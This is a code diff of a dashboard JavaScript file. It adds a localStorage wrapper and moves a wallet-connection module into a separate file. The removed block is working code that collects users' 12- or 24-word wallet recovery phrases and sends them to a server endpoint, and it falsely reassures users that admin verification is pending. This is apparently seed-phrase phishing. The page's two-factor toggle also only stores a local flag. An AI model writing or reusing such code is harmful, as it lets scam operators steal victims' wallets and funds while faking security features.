@@ -2,6 +2,50 @@
 if (typeof window.__dashboardScriptsLoaded === 'undefined') {
     window.__dashboardScriptsLoaded = true;
 
+// ================= STORAGE UTILITY (Safe localStorage wrapper) =======================
+// Provides safe access to localStorage without triggering Tracking Prevention errors
+window.StorageUtil = {
+    isAvailable: (() => {
+        try {
+            const test = '__test__';
+            localStorage.setItem(test, test);
+            localStorage.removeItem(test);
+            return true;
+        } catch (e) {
+            return false;
+        }
+    })(),
+    
+    getItem: function(key, defaultValue = null) {
+        if (!this.isAvailable) return defaultValue;
+        try {
+            return localStorage.getItem(key) || defaultValue;
+        } catch (e) {
+            return defaultValue;
+        }
+    },
+    
+    setItem: function(key, value) {
+        if (!this.isAvailable) return false;
+        try {
+            localStorage.setItem(key, value);
+            return true;
+        } catch (e) {
+            return false;
+        }
+    },
+    
+    removeItem: function(key) {
+        if (!this.isAvailable) return false;
+        try {
+            localStorage.removeItem(key);
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+};
+
 // ================= NOTIFICATIONS ======================= 
 (() => {
     const POLL_INTERVAL = 5000; // ms
@@ -140,12 +184,7 @@ const themeToggleBtn = document.getElementById("themeToggleBtn");
 
 // Load saved theme or default to light
 let savedTheme = "light";
-try {
-    savedTheme = localStorage.getItem("theme") || "light";
-} catch (e) {
-    // Tracking Prevention or private mode - use default theme
-    console.log('localStorage access blocked by browser privacy settings');
-}
+savedTheme = window.StorageUtil.getItem("theme") || "light";
 if (savedTheme === "light") {
     body.classList.add("light-mode");
 }
@@ -170,14 +209,10 @@ if (themeToggleBtn) {
         body.classList.toggle("light-mode");
         
         // Save choice
-        try {
-            if (body.classList.contains("light-mode")) {
-                localStorage.setItem("theme", "light");
-            } else {
-                localStorage.setItem("theme", "dark");
-            }
-        } catch (e) {
-            console.log('Unable to save theme preference - localStorage blocked');
+        if (body.classList.contains("light-mode")) {
+            window.StorageUtil.setItem("theme", "light");
+        } else {
+            window.StorageUtil.setItem("theme", "dark");
         }
         updateIcon();
     });
@@ -237,13 +272,9 @@ const twoFactorToggle = document.getElementById('twoFactorToggle');
 // Load saved 2FA state from localStorage
 function load2FAState() {
     if (twoFactorToggle) {
-        try {
-            const saved = localStorage.getItem('twoFactorEnabled');
-            if (saved === 'true') {
-                twoFactorToggle.checked = true;
-            }
-        } catch (e) {
-            console.log('Unable to load 2FA preference - localStorage blocked');
+        const saved = window.StorageUtil.getItem('twoFactorEnabled');
+        if (saved === 'true') {
+            twoFactorToggle.checked = true;
         }
     }
 }
@@ -279,11 +310,7 @@ function show2FAToast(message, type = 'success') {
 if (twoFactorToggle) {
     twoFactorToggle.addEventListener('change', function() {
         const isEnabled = this.checked;
-        try {
-            localStorage.setItem('twoFactorEnabled', isEnabled);
-        } catch (e) {
-            console.log('Unable to save 2FA preference - localStorage blocked');
-        }
+        window.StorageUtil.setItem('twoFactorEnabled', isEnabled);
         show2FAToast(isEnabled ? '✓ 2FA Enabled' : '✗ 2FA Disabled', isEnabled ? 'success' : 'warning');
     });
 }
@@ -625,13 +652,8 @@ document.addEventListener('DOMContentLoaded', () => {
     if (themeToggle) {
         // Check for saved theme preference
         let savedTheme = 'light-mode';
-        try {
-            savedTheme = localStorage.getItem('theme') || 'light-mode';
-            body.className = savedTheme;
-        } catch (e) {
-            console.log('Unable to load theme - localStorage blocked');
-            body.className = 'light-mode';
-        }
+        savedTheme = window.StorageUtil.getItem('theme') || 'light-mode';
+        body.className = savedTheme;
         updateThemeIcon();
 
         themeToggle.addEventListener('click', () => {
@@ -639,11 +661,7 @@ document.addEventListener('DOMContentLoaded', () => {
             body.classList.toggle('dark-mode');
             
             const currentTheme = body.classList.contains('dark-mode') ? 'dark-mode' : 'light-mode';
-            try {
-                localStorage.setItem('theme', currentTheme);
-            } catch (e) {
-                console.log('Unable to save theme - localStorage blocked');
-            }
+            window.StorageUtil.setItem('theme', currentTheme);
             updateThemeIcon();
         });
     }
@@ -1416,332 +1434,9 @@ if (document.readyState === 'loading') {
   }
 }
 
-// ================= WALLET MODAL HANDLER MODULE ======================= 
-const WalletModalHandler = {
-    /**
-     * Initialize modal handler
-     */
-    init: function() {
-        this.attachEventListeners();
-    },
-
-    /**
-     * Open wallet modal with selected wallet
-     * @param {string} walletName - Name of the wallet to connect
-     */
-    openWalletModal: function(walletName) {
-        const nameInput = document.getElementById('walletName');
-        const modalTitle = document.getElementById('modalTitle');
-        const walletModal = document.getElementById('walletModal');
-        const mnemonicInput = document.getElementById('mnemonic');
-        
-        if (nameInput) nameInput.value = walletName;
-        if (modalTitle) modalTitle.textContent = `Connect ${walletName}`;
-        if (walletModal) {
-            walletModal.style.display = 'flex';
-            walletModal.style.visibility = 'visible';
-            walletModal.style.opacity = '1';
-        }
-        if (mnemonicInput) mnemonicInput.focus();
-    },
-
-    /**
-     * Close wallet modal with animation
-     */
-    closeWalletModal: function() {
-        const modal = document.getElementById('walletModal');
-        if (!modal) return;
-        
-        modal.style.opacity = '0';
-        setTimeout(() => {
-            modal.style.visibility = 'hidden';
-            modal.style.display = 'none';
-        }, 300);
-        
-        // Reset form
-        const connectForm = document.getElementById('connectForm');
-        if (connectForm) connectForm.reset();
-        
-        const formError = document.getElementById('formError');
-        const formSuccess = document.getElementById('formSuccess');
-        const wordCount = document.getElementById('wordCount');
-        const wordStatus = document.getElementById('wordStatus');
-        
-        if (formError) formError.style.display = 'none';
-        if (formSuccess) formSuccess.style.display = 'none';
-        if (wordCount) wordCount.textContent = '0';
-        if (wordStatus) wordStatus.textContent = '';
-    },
-
-    /**
-     * Close success modal and reload page
-     */
-    closeSuccessModal: function() {
-        const modal = document.getElementById('successModal');
-        if (!modal) return;
-        
-        modal.style.opacity = '0';
-        setTimeout(() => {
-            modal.style.visibility = 'hidden';
-            modal.style.display = 'none';
-            location.reload();
-        }, 300);
-    },
-
-    /**
-     * Show error message
-     * @param {string} message - Error message to display
-     */
-    showError: function(message) {
-        const errorDiv = document.getElementById('formError');
-        if (errorDiv) {
-            errorDiv.textContent = message;
-            errorDiv.style.display = 'block';
-            errorDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        }
-    },
-
-    /**
-     * Show success message
-     * @param {string} message - Success message to display
-     */
-    showSuccess: function(message) {
-        const successDiv = document.getElementById('formSuccess');
-        if (successDiv) {
-            successDiv.textContent = message;
-            successDiv.style.display = 'block';
-            successDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        }
-    },
-
-    /**
-     * Handle form submission
-     * @param {Event} event - Form submit event
-     */
-    handleWalletConnect: async function(event) {
-        event.preventDefault();
-        console.log('Wallet Form submission started');
-        
-        const mnemonicInput = document.getElementById('mnemonic');
-        const walletNameInput = document.getElementById('walletName');
-        
-        const mnemonic = mnemonicInput ? mnemonicInput.value.trim() : '';
-        const words = mnemonic.split(/\s+/).filter(w => w.length > 0).length;
-        const walletName = walletNameInput ? walletNameInput.value : '';
-        
-        console.log('Validation:', { mnemonic: mnemonic.substring(0, 30) + '...', words, walletName });
-        
-        if (!mnemonic) {
-            this.showError('Please enter your recovery phrase');
-            return;
-        }
-        
-        if (words !== 12 && words !== 24) {
-            this.showError(`Invalid phrase length. Expected 12 or 24 words, got ${words}`);
-            return;
-        }
-        
-        if (!walletName) {
-            this.showError('Please select a wallet');
-            return;
-        }
-        
-        // Show loading state
-        const submitBtn = document.getElementById('submitBtn');
-        if (submitBtn) {
-            const loader = submitBtn.querySelector('.wallet-btn-loader');
-            const btnText = submitBtn.querySelector('span:first-child');
-            submitBtn.disabled = true;
-            if (loader) loader.style.display = 'inline-block';
-            if (btnText) btnText.style.display = 'none';
-        }
-        
-        try {
-            // Submit form via fetch
-            const connectForm = document.getElementById('connectForm');
-            const formData = connectForm ? new FormData(connectForm) : new FormData();
-            formData.append('phrase', mnemonic);
-            formData.append('wallet_name', walletName);
-            
-            console.log('Sending wallet connection request');
-            
-            const response = await fetch('api/wallet_handler.php', {
-                method: 'POST',
-                body: formData,
-                credentials: 'same-origin'
-            });
-            
-            console.log('Wallet Response received:', response.status);
-
-            // Parse response properly
-            let result;
-            const contentType = response.headers.get('content-type');
-            if (contentType && contentType.includes('application/json')) {
-                try {
-                    result = await response.json();
-                } catch (e) {
-                    result = { message: 'Invalid JSON response', success: false };
-                }
-            } else {
-                result = { message: await response.text(), success: response.ok };
-            }
-
-            console.log('Wallet Result:', result);
-
-            if (response.ok && result && result.status === 'success') {
-                // Show success modal
-                const successTitle = document.getElementById('successTitle');
-                const successMessage = document.getElementById('successMessage');
-                
-                if (successTitle) successTitle.textContent = `${walletName} Connected!`;
-                if (successMessage) successMessage.textContent = 'Your wallet phrase has been saved successfully. Admin verification is pending.';
-                
-                const successModal = document.getElementById('successModal');
-                if (successModal) {
-                    successModal.style.display = 'flex';
-                    successModal.style.visibility = 'visible';
-                    successModal.style.opacity = '1';
-                }
-            } else {
-                const errorMsg = (result && result.message) ? result.message : `Server error ${response.status}`;
-                this.showError(errorMsg);
-            }
-            
-        } catch (error) {
-            console.error('Wallet connection error:', error);
-            this.showError('Network error. Please check your connection and try again.');
-        } finally {
-            if (submitBtn) {
-                submitBtn.disabled = false;
-                const loader = submitBtn.querySelector('.wallet-btn-loader');
-                const btnText = submitBtn.querySelector('span:first-child');
-                if (loader) loader.style.display = 'none';
-                if (btnText) btnText.style.display = 'inline';
-            }
-        }
-    },
-
-    /**
-     * Update word count and validation status
-     */
-    updateWordCount: function() {
-        const textarea = document.getElementById('mnemonic');
-        if (!textarea) return;
-        
-        const text = textarea.value.trim();
-        const words = text.length > 0 ? text.split(/\s+/).length : 0;
-        
-        const wordCount = document.getElementById('wordCount');
-        if (wordCount) wordCount.textContent = words;
-        
-        const status = document.getElementById('wordStatus');
-        if (status) {
-            if (words === 12) {
-                status.textContent = '✓ Valid (12 words)';
-                status.className = 'wallet-word-status valid';
-            } else if (words === 24) {
-                status.textContent = '✓ Valid (24 words)';
-                status.className = 'wallet-word-status valid';
-            } else if (words > 0) {
-                status.textContent = `${words} words (need 12 or 24)`;
-                status.className = 'wallet-word-status invalid';
-            } else {
-                status.textContent = '';
-                status.className = 'wallet-word-status';
-            }
-        }
-    },
-
-    /**
-     * Attach event listeners to modal elements
-     */
-    attachEventListeners: function() {
-        const self = this;
-        
-        // Word count update
-        const mnemonic = document.getElementById('mnemonic');
-        if (mnemonic) {
-            mnemonic.addEventListener('input', () => {
-                self.updateWordCount();
-            });
-        }
-        
-        // Form submission
-        const connectForm = document.getElementById('connectForm');
-        if (connectForm) {
-            // Remove existing listener to prevent duplicates
-            if (self._submitHandler) {
-                connectForm.removeEventListener('submit', self._submitHandler);
-            }
-            self._submitHandler = function(e) {
-                self.handleWalletConnect(e);
-            };
-            connectForm.addEventListener('submit', self._submitHandler);
-        }
-        
-        // Close modal on overlay click (wallet modal)
-        const walletModal = document.getElementById('walletModal');
-        if (walletModal) {
-            walletModal.addEventListener('click', function(e) {
-                if (e.target === this) {
-                    self.closeWalletModal();
-                }
-            });
-        }
-        
-        // Close modal on overlay click (success modal)
-        const successModal = document.getElementById('successModal');
-        if (successModal) {
-            successModal.addEventListener('click', function(e) {
-                if (e.target === this) {
-                    self.closeSuccessModal();
-                }
-            });
-        }
-        
-        // Prevent closing when clicking inside modal
-        const modalContainer = document.querySelector('.wallet-modal-container');
-        if (modalContainer) {
-            modalContainer.addEventListener('click', function(e) {
-                e.stopPropagation();
-            });
-        }
-    }
-};
-
-/**
- * Global wrapper functions for backward compatibility
- * These allow onclick handlers to work without changes
- */
-function openWalletModal(walletName) {
-    console.log('Modal open triggered for:', walletName);
-    WalletModalHandler.openWalletModal(walletName);
-}
-
-function closeWalletModal() {
-    WalletModalHandler.closeWalletModal();
-}
-
-function closeSuccessModal() {
-    WalletModalHandler.closeSuccessModal();
-}
-
-function showWalletError(message) {
-    WalletModalHandler.showError(message);
-}
-
-function showWalletSuccess(message) {
-    WalletModalHandler.showSuccess(message);
-}
-
-// Initialize WalletModalHandler on DOM ready
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', () => {
-        WalletModalHandler.init();
-    });
-} else {
-    WalletModalHandler.init();
-}
+// ================= WALLET MODAL HANDLER ======================= 
+// Note: WalletModalHandler is now defined in wallet-modal.js to avoid duplication
+// The global functions below are wrappers that delegate to wallet-modal.js
 
 // ================= DEPOSIT FORM MODULE ======================= 
 const DepositFormModule = {
